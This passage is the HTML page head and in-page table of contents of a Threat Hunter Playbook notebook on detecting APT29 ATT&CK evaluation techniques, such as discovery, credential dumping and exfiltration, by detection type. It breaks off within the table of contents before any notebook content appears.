

<!DOCTYPE html>

<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Free Telemetry Notebook &#8212; Threat Hunter Playbook</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
    <link href="../../_static/css/index.css" rel="stylesheet">
    <link rel="stylesheet" href="../../_static/sphinx-book-theme.css" type="text/css" />
    <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-dropdown.css" />
    <script id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
    <script src="../../_static/jquery.js"></script>
    <script src="../../_static/underscore.js"></script>
    <script src="../../_static/doctools.js"></script>
    <script src="../../_static/language_data.js"></script>
    <script src="../../_static/togglebutton.js"></script>
    <script src="../../_static/clipboard.min.js"></script>
    <script src="../../_static/copybutton.js"></script>
    <script src="../../_static/sphinx-book-theme.js"></script>
    <script >var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
    <script async="async" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <script type="text/x-mathjax-config">MathJax.Hub.Config({"tex2jax": {"inlineMath": [["\\(", "\\)"]], "displayMath": [["\\[", "\\]"]], "processRefs": false, "processEnvironments": false}})</script>
    <script async="async" src="https://unpkg.com/thebelab@latest/lib/index.js"></script>
    <script >
        const thebe_selector = ".thebe,.cell"
        const thebe_selector_input = "pre,.cell_input div.highlight"
        const thebe_selector_output = ".output,.cell_output"
    </script>
    <script async="async" src="../../_static/sphinx-thebe.js"></script>
    <link rel="canonical" href="https://threathunterplaybook.com/notebooks/campaigns/apt29Evals.html" />
    <link rel="shortcut icon" href="../../_static/favicon.ico"/>
    <link rel="index" title="Index" href="../../genindex.html" />
    <link rel="search" title="Search" href="../../search.html" />
    <link rel="next" title="Windows" href="../windows/intro.html" />
    <link rel="prev" title="Free Telemetry Report" href="../../evals/apt29/report.html" />

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="docsearch:language" content="en">


<!-- Opengraph tags -->
<meta property="og:url"         content="https://threathunterplaybook.com/notebooks/campaigns/apt29Evals.html" />
<meta property="og:type"        content="article" />
<meta property="og:title"       content="Free Telemetry Notebook" />
<meta property="og:description" content="Free Telemetry Notebook          Group  APT29  Description  APT29 is a threat group that has been attributed to the Russian government and has operated since at" />
<meta property="og:image"       content="https://threathunterplaybook.com/_static/logo.png" />

<meta name="twitter:card" content="summary" />


  </head>
  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
    

    <div class="container-xl">
      <div class="row">
          
<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
    
        <div class="navbar-brand-box">
<a class="navbar-brand text-wrap" href="../../index.html">
  
  <img src="../../_static/logo.png" class="logo" alt="logo">
  
  
  <h1 class="site-logo" id="site-title">Threat Hunter Playbook</h1>
  
</a>
</div>

<form class="bd-search d-flex align-items-center" action="../../search.html" method="get">
  <i class="icon fas fa-search"></i>
  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
</form>

<nav class="bd-links" id="bd-docs-nav" aria-label="Main navigation">
  <p class="caption">
 <span class="caption-text">
  Knowledge Library
 </span>
</p>
<ul class="nav sidenav_l1">
 <li class="toctree-l1">
  <a class="reference internal" href="../../library/azure/intro.html">
   Azure
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../../library/windows/intro.html">
   Windows
  </a>
 </li>
</ul>
<p class="caption">
 <span class="caption-text">
  Pre-Hunt Activities
 </span>
</p>
<ul class="nav sidenav_l1">
 <li class="toctree-l1">
  <a class="reference internal" href="../../pre-hunt/data_management.html">
   Data Management
  </a>
 </li>
</ul>
<p class="caption">
 <span class="caption-text">
  Campaign Notebooks
 </span>
</p>
<ul class="current nav sidenav_l1">
 <li class="toctree-l1 current active">
  <a class="reference internal" href="../../evals/intro.html">
   ATT&amp;CK Evaluations
  </a>
  <ul class="current">
   <li class="toctree-l2 current active">
    <a class="reference internal" href="../../evals/apt29/intro.html">
     APT 29
    </a>
    <ul class="current">
     <li class="toctree-l3">
      <a class="reference internal" href="../../evals/apt29/report.html">
       Free Telemetry Report
      </a>
     </li>
     <li class="toctree-l3 current active">
      <a class="current reference internal" href="#">
       Free Telemetry Notebook
      </a>
     </li>
    </ul>
   </li>
  </ul>
 </li>
</ul>
<p class="caption">
 <span class="caption-text">
  Targeted Notebooks
 </span>
</p>
<ul class="nav sidenav_l1">
 <li class="toctree-l1">
  <a class="reference internal" href="../windows/intro.html">
   Windows
  </a>
 </li>
</ul>
<p class="caption">
 <span class="caption-text">
  Tutorials
 </span>
</p>
<ul class="nav sidenav_l1">
 <li class="toctree-l1">
  <a class="reference internal" href="../../tutorials/jupyter/introduction.html">
   Jupyter Notebooks
  </a>
 </li>
</ul>

</nav>

 <!-- To handle the deprecated key -->

<div class="navbar_extra_footer">
  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
</div>

</div>


          


          
<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
    
    <div class="row topbar fixed-top container-xl">
    <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show">
    </div>
    <div class="col pl-2 topbar-main">
        
        <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
            data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
            aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
            title="Toggle navigation" data-toggle="tooltip" data-placement="left">
            <i class="fas fa-bars"></i>
            <i class="fas fa-arrow-left"></i>
            <i class="fas fa-arrow-up"></i>
        </button>
        
        <div class="dropdown-buttons-trigger">
    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
            class="fas fa-download"></i></button>

    
    <div class="dropdown-buttons">
        <!-- ipynb file if we had a myst markdown file -->
        
        <!-- Download raw file -->
        <a class="dropdown-buttons" href="../../_sources/notebooks/campaigns/apt29Evals.ipynb"><button type="button"
                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                data-placement="left">.ipynb</button></a>
        <!-- Download PDF via print -->
        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
            onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
    </div>
    
</div>
        <!-- Source interaction buttons -->

<div class="dropdown-buttons-trigger">
    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn"
        aria-label="Connect with source repository"><i class="fab fa-github"></i></button>
    <div class="dropdown-buttons sourcebuttons">
        <a class="repository-button"
            href="https://github.com/OTRF/ThreatHunter-Playbook"><button type="button" class="btn btn-secondary topbarbtn"
                data-toggle="tooltip" data-placement="left" title="Source repository"><i
                    class="fab fa-github"></i>repository</button></a>
        <a class="issues-button"
            href="https://github.com/OTRF/ThreatHunter-Playbook/issues/new?title=Issue%20on%20page%20%2Fnotebooks/campaigns/apt29Evals.html&body=Your%20issue%20content%20here."><button
                type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
                title="Open an issue"><i class="fas fa-lightbulb"></i>open issue</button></a>
        <a class="edit-button" href="https://github.com/OTRF/ThreatHunter-Playbook/edit/master/docs/notebooks/campaigns/apt29Evals.ipynb"><button
                type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
                title="Edit this page"><i class="fas fa-pencil-alt"></i>suggest edit</button></a>
    </div>
</div>


        <!-- Full screen (wrap in <a> to have style consistency -->
        <a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
                data-placement="bottom" onclick="toggleFullScreen()" title="Fullscreen mode"><i
                    class="fas fa-expand"></i></button></a>

        <!-- Launch buttons -->

<div class="dropdown-buttons-trigger">
    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn"
        aria-label="Launch interactive content"><i class="fas fa-rocket"></i></button>
    <div class="dropdown-buttons">
        
        <a class="binder-button" href="https://mybinder.org/v2/gh/OTRF/ThreatHunter-Playbook/master?urlpath=tree/docs/notebooks/campaigns/apt29Evals.ipynb"><button type="button"
                class="btn btn-secondary topbarbtn" title="Launch Binder" data-toggle="tooltip"
                data-placement="left"><img class="binder-button-logo"
                    src="../../_static/images/logo_binder.svg"
                    alt="Interact on binder">Binder</button></a>
        
        
        
        <a class="colab-button" href="https://colab.research.google.com/github/OTRF/ThreatHunter-Playbook/blob/master/docs/notebooks/campaigns/apt29Evals.ipynb"><button type="button" class="btn btn-secondary topbarbtn"
                title="Launch Colab" data-toggle="tooltip" data-placement="left"><img class="colab-button-logo"
                    src="../../_static/images/logo_colab.png"
                    alt="Interact on Colab">Colab</button></a>
        
        <button type="button" class="btn btn-secondary topbarbtn"
            onclick="initThebeSBT()" title="Launch Thebe" data-toggle="tooltip" data-placement="left"><i
                class="fas fa-play"></i><span style="margin-left: .4em;">Live Code</span></button>
        
    </div>
</div>

    </div>

    <!-- Table of contents -->
    <div class="d-none d-md-block col-md-2 bd-toc show">
        <div class="tocsection onthispage pt-5 pb-3">
            <i class="fas fa-list"></i> Contents
        </div>
        <nav id="bd-toc-nav">
            <ul class="nav section-nav flex-column">
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#telemetry-detection-category">
   Telemetry Detection Category
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#import-libraries">
   Import Libraries
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#start-spark-session">
   Start Spark Session
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#decompress-dataset">
   Decompress Dataset
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#import-datasets">
   Import Datasets
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#create-temporary-sql-view">
   Create Temporary SQL View
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#adversary-detection-steps">
   Adversary - Detection Steps
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-1-user-execution">
   1.A.1. User Execution
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#detection-type-telemetry-none">
     Detection Type:Telemetry(None)
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#detection-type-general-none">
     Detection Type:General(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-2-masquerading">
   1.A.2. Masquerading
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id1">
     Detection Type:Telemetry(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-3-uncommonly-used-port">
   1.A.3. Uncommonly Used Port
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id2">
     Detection Type:Telemetry(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-4-standard-cryptographic-protocol">
   1.A.4. Standard Cryptographic Protocol
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#detection-type-none-none">
     Detection Type:None(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-1-command-line-interface">
   1.B.1. Command-Line Interface
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#detection-type-telemetry-correlated">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-2-powershell">
   1.B.2. PowerShell
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id3">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-1-file-and-directory-discovery">
   2.A.1. File and Directory Discovery
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id4">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-2-automated-collection">
   2.A.2. Automated Collection
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id5">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-3-data-from-local-system">
   2.A.3. Data from Local System
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id6">
     Detection Type:None(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-4-data-compressed">
   2.A.4. Data Compressed
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id7">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-5-data-staged">
   2.A.5. Data Staged
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id8">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-1-exfiltration-over-command-and-control-channel">
   2.B.1. Exfiltration Over Command and Control Channel
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id9">
     Detection Type:None(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-1-remote-file-copy">
   3.A.1. Remote File Copy
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id10">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-2-obfuscated-files-or-information">
   3.A.2. Obfuscated Files or Information
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id11">
     Detection Type:Telemetry(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-1-component-object-model-hijacking">
   3.B.1. Component Object Model Hijacking
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id12">
     Detection Type:Telemetry(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-2-bypass-user-account-control">
   3.B.2. Bypass User Account Control
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#detection-type-technique-none">
     Detection Type:Technique(None)
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id13">
     Detection Type:Telemetry(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-3-commonly-used-port">
   3.B.3. Commonly Used Port
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id14">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-4-standard-application-layer-protocol">
   3.B.4. Standard Application Layer Protocol
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id15">
     Detection Type:None(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-5-standard-cryptographic-protocol">
   3.B.5. Standard Cryptographic Protocol
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id16">
     Detection Type:None(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-1-modify-registry">
   3.C.1. Modify Registry
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id17">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#id18">
   4.A.1. Remote File Copy
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id19">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-2-powershell">
   4.A.2. PowerShell
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id20">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-3-deobfuscate-decode-files-or-information">
   4.A.3. Deobfuscate/Decode Files or Information
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id21">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-1-process-discovery">
   4.B.1. Process Discovery
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id22">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-2-file-deletion">
   4.B.2. File Deletion
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id23">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-3-file-deletion">
   4.B.3. File Deletion
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id24">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-4-file-deletion">
   4.B.4. File Deletion
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id25">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-1-file-and-directory-discovery">
   4.C.1. File and Directory Discovery
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id26">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-2-system-owner-user-discovery">
   4.C.2. System Owner/User Discovery
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id27">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-3-system-information-discovery">
   4.C.3. System Information Discovery
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id28">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-4-system-network-configuration-discovery">
   4.C.4. System Network Configuration Discovery
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id29">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-5-process-discovery">
   4.C.5. Process Discovery
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id30">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-6-system-information-discovery">
   4.C.6. System Information Discovery
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id31">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-7-security-software-discovery">
   4.C.7. Security Software Discovery
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id32">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-8-security-software-discovery">
   4.C.8. Security Software Discovery
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id33">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-9-permission-groups-discovery">
   4.C.9. Permission Groups Discovery
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#detection-type-technique-alert">
     Detection Type:technique(alert)
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id34">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-10-execution-through-api">
   4.C.10. Execution through API
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id35">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-11-permission-groups-discovery">
   4.C.11. Permission Groups Discovery
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id36">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-12-execution-through-api">
   4.C.12. Execution through API
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id37">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-1-new-service">
   5.A.1. New Service
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id38">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-1-registry-run-keys-startup-folder">
   5.B.1. Registry Run Keys / Startup Folder
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id39">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-1-credentials-in-files">
   6.A.1. Credentials in Files
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id40">
     Detection Type:None(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-2-credential-dumping">
   6.A.2. Credential Dumping
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id41">
     Detection Type:None(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-3-masquerading">
   6.A.3. Masquerading
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id42">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#detection-type-general-correlated">
     Detection Type:General(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-1-private-keys">
   6.B.1. Private Keys
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id43">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-1-credential-dumping">
   6.C.1. Credential Dumping
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id44">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-1-screen-capture">
   7.A.1. Screen Capture
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id45">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id46">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-2-clipboard-data">
   7.A.2. Clipboard Data
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id47">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-3-input-capture">
   7.A.3. Input Capture
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id48">
     Detection Type:None(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-1-data-from-local-system">
   7.B.1. Data from Local System
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id49">
     Detection Type:None(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-2-data-compressed">
   7.B.2. Data Compressed
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id50">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-3-data-encrypted">
   7.B.3. Data Encrypted
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id51">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-4-exfiltration-over-alternative-protocol">
   7.B.4. Exfiltration Over Alternative Protocol
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id52">
